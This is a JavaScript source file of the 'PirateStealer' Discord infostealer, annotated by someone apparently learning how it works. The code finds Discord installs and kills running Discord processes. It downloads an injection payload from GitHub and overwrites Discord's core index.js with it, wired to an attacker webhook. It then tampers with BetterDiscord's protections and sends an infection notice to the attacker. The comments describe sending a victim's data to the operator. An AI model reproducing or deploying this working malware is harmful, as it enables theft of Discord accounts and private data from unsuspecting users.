var glob = require("glob");
//glob is used for file matching, by using patterns used by the shell
//src: https://www.npmjs.com/package/glob

const fs = require("fs");
//Used for file io

const https = require("https");

const { exec } = require("child_process");
//child_process provides modules for creating sub processes. basically runs shell commands
//exec will be used to spawn a shell and run commands in the shell

const axios = require("axios");
//Axios is a promised based api for sending Http requests
//src = https://www.npmjs.com/package/axios

const buf_replace = require("buffer-replace");
//it replaces all occurences of a string with another string in a buffer
//src = https://www.npmjs.com/package/buffer-replace

const hook = "da_webhook";
//This is where u put in your webhook. After getting the client data you want from a victim's discord
//your webhook will send the data over to you on discord

const config = {
  logout: "%LOGOUT%1",
  "inject-notify": "%INJECTNOTI%1",
  "logout-notify": "%LOGOUTNOTI%1",
  "init-notify": "%INITNOTI%1",
  "embed-color": "%MBEDCOLOR%1",
  "disable-qr-code": "%DISABLEQRCODE%1",
};
//TODO: Config parameters, i don't know what they are used for yet

var LOCAL = process.env.LOCALAPPDATA;
var discords = [];
//TODO: discord processes that could be run?
var injectPath = [];
var runningDiscords = [];
//TODO: discords already running?
function main() {
    //So the logic of this script is,
    //Step 1, find evidence of discord and document them. if not, stop the code
    //Step 2, Find the discord_desktop_core\\index.js file, which is what we will be infecting
    //Step 3, Check to see if discord is running
    //Step 4, if it's running, kill the discord process
        //1, Call the infect function
        //The infection basically just grabs the injection.js file on github
        //And replaces the index.js file from step 2 with the injection.js file and
        //replaces that with a malicious version with the data we give it
        //Creates some folders and starts up discord again, but with the infected index.js version
        //Then calls pawn better discord
    //Step 4.2 Else, infect discord
        //and practically just runs the indented comments

  fs.readdirSync(LOCAL).forEach((file) => {
    if (file.includes("iscord")) {
      discords.push(LOCAL + "\\" + file);
    } else {
      return;
    }
  });
  //TODO: You are looking for evidence of discord in the local app data folder
  //I don't know why this is done exactly

  discords.forEach(function (file) {
    let pattern =
      `${file}` +
      "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js";
    glob.sync(pattern).map((file) => {
      injectPath.push(file);
    });
  });
  //We are looking for an index.js file that will be key to injecting the malware

  listDiscords();
}

function listDiscords() {
  exec("tasklist", function (err, stdout, stderr) {
    //tasklist shows you a list of, well, the tasklists running on windows
    if (stdout.includes("Discord.exe")) {
      runningDiscords.push("discord");
      //if discord is running, push the string
    }
    if (stdout.includes("DiscordCanary.exe")) {
      runningDiscords.push("discordcanary");
    }
    if (stdout.includes("DiscordDevelopment.exe")) {
      runningDiscords.push("discorddevelopment");
    }
    if (stdout.includes("DiscordPTB.exe")) {
      runningDiscords.push("discordptb");
    }

    //the infect function is really where the magic takes place
    if (config.logout == "instant") {
      //TODO, i don't think this is run the first time ever
        killDiscord();
        //☝️ the infect function still get's called in the kill discord function
        //also this kills discord
    } else {
      if (config["inject-notify"] == "true" && injectPath.length != 0) {
        injectNotify();
      }
      Infect();
      //where the infection happens
        pwnBetterDiscord();
        //☝️ replace all occurence of the word webhook with stanley is good
    }
  });
}

function Infect() {
  https
    .get(
      "https://raw.githubusercontent.com/PirateMonster/PirateStealer/main/src/injection/injection.js",
      //get the injection.js file
      (response) => {
        let data = "";
        response.on("data", (chunk) => {
          data += chunk;
        });
        //data should now equal what's in injection.js, slowly adding chunk to data
        //remember that getting data via networking happens in chunks right?
        response.on("end", () => {
          injectPath.forEach((file) => {
            //remember we added possible attack vectors to the index path?
            fs.writeFileSync(
              file,
              data
                .replace("%WEBHOOK_LINK%", hook)
                .replace("%INITNOTI%", config["init-notify"])
                .replace("%LOGOUT%", config.logout)
                .replace("%LOGOUTNOTI%", config["logout-notify"])
                .replace("3447704", config["embed-color"])
                .replace("%DISABLEQRCODE%", config["disable-qr-code"]),
              {
                encoding: "utf8",
                flag: "w",
              }
            );
            //Practically just write an edited? version of the actual discord index.js file
            //but we are replacing some key information that exists in injection.js
            //with data in our config file

            if (config["init-notify"] == "true") {
              let init = file.replace("index.js", "init");
              if (!fs.existsSync(init)) {
                fs.mkdirSync(init, 0744);
              }
            }
            //can't say i know what this does, just makes an init folder?. TODO

            if (config.logout != "false") {
              let folder = file.replace("index.js", "PirateStealerBTW");
              if (!fs.existsSync(folder)) {
                  fs.mkdirSync(folder, 0744);
                  
                if (config.logout == "instant") {
                  startDiscord();
                }
              } else if (fs.existsSync(folder) && config.logout == "instant") {
                startDiscord();
              }
            }
            //This neither, I don't think i know what folder is used for. TODO
          });
        });
      }
    )
    .on("error", (err) => {
      console.log(err);
    });
}

function killDiscord() {
  runningDiscords.forEach((disc) => {
    exec(`taskkill /IM ${disc}.exe /F`, (err) => {
      if (err) {
        return;
      }
    });
  });
  if (config["inject-notify"] == "true" && injectPath.length != 0) {
    injectNotify();
  }
  Infect();
  pwnBetterDiscord();
}
function startDiscord() {
  runningDiscords.forEach((disc) => {
    let path =
      LOCAL + "\\" + disc + "\\Update.exe --processStart " + disc + ".exe";
    exec(path, (err) => {
      if (err) {
        return;
      }
    });
  });
}

function pwnBetterDiscord() {
  // thx stanley
    var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar";
    //If this exists ☝️
  if (fs.existsSync(dir)) {
    var x = fs.readFileSync(dir);
      fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "stanleyisgod"));
      //replace all occurence of api/webhooks with stanleyisgood in dir
  } else {
    return;
  }
}
//I have no idea what better discord is
//I think this justs set's the webhook? 

function injectNotify() {
    //what this does is that this sends you a notification on discord that you have infected someone's computer
    //how this works is that when the function is called, axios sends a post request that's captured? by the webhook
    //which get's to your discord front door
  var fields = [];
  injectPath.forEach((path) => {
    var c = {
      name: ":syringe: Inject Path",
      value: `\`\`\`${path}\`\`\``,
      inline: !1,
    };
    fields.push(c);
  });
  axios
    .post(hook, {
      content: null,
      embeds: [
        {
          title: ":detective: Successfull injection",
          color: config["embed-color"],
          fields: fields,
          author: {
            name: "PirateStealer",
          },
          footer: {
            text: "PirateStealer",
          },
        },
      ],
    })
    .then((res) => {})
        .catch((error) => { });
    
}

main();
